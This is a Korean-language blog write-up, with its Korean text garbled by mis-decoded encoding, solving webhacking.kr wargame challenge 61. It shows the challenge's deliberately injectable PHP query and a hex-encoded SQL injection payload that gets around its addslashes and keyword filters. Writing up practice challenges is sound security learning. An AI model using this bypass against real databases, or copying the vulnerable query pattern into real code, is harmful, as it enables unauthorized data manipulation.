---
title: "[webhacking.kr] 61ë²ˆ ë¬¸ì œ í’€ì´[SQL Injection]"
categories:
  - webhacking
tags:
  - webhacking.kr
  - wargame
  - sql injection
toc: true
toc_sticky: true
toc_label: "61ë²ˆ ë¬¸ì œ í’€ì´"
toc_icon: "bookmark"
author_profile: true
header:
  teaser: /assets/images/webhacking.jpg
---

ğŸ’¡ Webhacking.kr challenge(old) 61ë²ˆ ë¬¸ì œì— ëŒ€í•œ í’€ì´ì…ë‹ˆë‹¤.
{: .notice--warning}

# ë¬¸ì œ
![image](https://user-images.githubusercontent.com/33647663/154064162-8f95d0a1-fd9a-4dae-b93e-8101417f4988.png){: .align-center}

```php
<?php
  if(!$_GET['id']) $_GET['id']="guest";
  $_GET['id'] = addslashes($_GET['id']);
  if(preg_match("/\(|\)|select|from|,|by|\./i",$_GET['id'])) exit("Access Denied");
  if(strlen($_GET['id'])>15) exit("Access Denied");
  $result = mysqli_fetch_array(mysqli_query($db,"select {$_GET['id']} from chall61 order by id desc limit 1"));
  echo "<b>{$result['id']}</b><br>";
  if($result['id'] == "admin") solve(61);
  echo "</body></html>";
?>
```

<br>

# ë¬¸ì œ í’€ì´
ìœ„ì˜ php ì†ŒìŠ¤ì½”ë“œë¥¼ í•´ì„í•˜ë©´ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.


$_GET['id']ë¡œ idë¥¼ ì…ë ¥ë°›ìŠµë‹ˆë‹¤. ê·¸ë¦¬ê³  ë‹¤ìŒì˜ 3ê°€ì§€ ì¡°ê±´ì„ ê²€ì‚¬í•©ë‹ˆë‹¤.

1. addslashes()
2. ( / ) / select / from / , / by  / .   í•„í„°ë§
3. ê¸¸ì´ ì œí•œ 15

ê·¸ë¦¬ê³  ë‹¤ìŒì˜ sql ë¬¸ì´ ì‹¤í–‰ë©ë‹ˆë‹¤.

```sql
select {id} from chall61 order by id desc limit 1
```

ìœ„ì˜ sql ë¬¸ ì‹¤í–‰ê²°ê³¼ í´ë¦¬ì–´ ì¡°ê±´ì€ ì»¬ëŸ¼ëª…ì´ id, ì»¬ëŸ¼ ê°’ì´ admin ì´ì–´ì•¼ í•©ë‹ˆë‹¤. ì´ë¥¼ ìœ„í•´ì„œ sqlë¬¸ì—ì„œ ì»¬ëŸ¼ëª…ì„ ë°”ê¿”ì£¼ëŠ” as ë¬¸ë²•ì„ ì•Œì•„ì•¼ í•©ë‹ˆë‹¤.

```sql
select 'admin' as id ;
select 'admin' id  # asëŠ” ìƒëµ ê°€ëŠ¥
```

![image](https://user-images.githubusercontent.com/33647663/154065481-20f26bb4-1438-466d-8d67-a727f3e53693.png){: .align-center}

![image](https://user-images.githubusercontent.com/33647663/154065621-ab82db53-48ad-4613-9619-dce5c12eb970.png){: .align-center}

í•˜ì§€ë§Œ í˜„ì¬ id ê°’ì— addslashesí•¨ìˆ˜ê°€ ì¡´ì¬í•˜ë¯€ë¡œ ```'``` ëŠ” ì‚¬ìš©í•˜ì§€ ëª»í•©ë‹ˆë‹¤. ë”°ë¼ì„œ ë‹¤ìŒê³¼ ê°™ì´ 0xë¡œ ìš°íšŒí•˜ì—¬ adminì„ ì…ë ¥í•´ ì¤ë‹ˆë‹¤.

```
id=0x61646d696e id
```
ì´ë ‡ê²Œ í•˜ë©´ ë¬¸ì œì—ì„œ ìš”êµ¬í•˜ëŠ” 3ê°€ì§€ ì¡°ê±´ì„ ëª¨ë‘ ë§Œì¡±í•˜ì—¬ ë¬¸ì œê°€ í’€ë¦½ë‹ˆë‹¤.

![image](https://user-images.githubusercontent.com/33647663/154066148-8b11521c-3323-4e83-9037-25af0c32c56b.png){: .align-center}



